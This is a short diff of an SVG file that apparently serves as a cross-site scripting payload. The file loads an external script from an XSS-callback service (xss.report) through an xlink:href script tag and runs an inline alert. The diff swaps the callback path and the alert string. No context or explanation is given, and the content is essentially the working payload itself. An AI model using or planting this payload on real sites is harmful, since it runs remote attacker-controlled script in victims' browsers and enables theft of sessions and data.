@@ -9,10 +9,11 @@
        xmlns:xlink="http://www.w3.org/1999/xlink"
        xml:space="preserve">
     <!-- Script linked from the outside-->
-    <script xlink:href="https://xss.report/c/whoami" />
+    <script xlink:href="https://xss.report/c/bytes" />
     <script>
       //<![CDATA[
-        alert("mitsec");
+        alert("byteskn");
       ]]>
     </script>
+
   </svg>
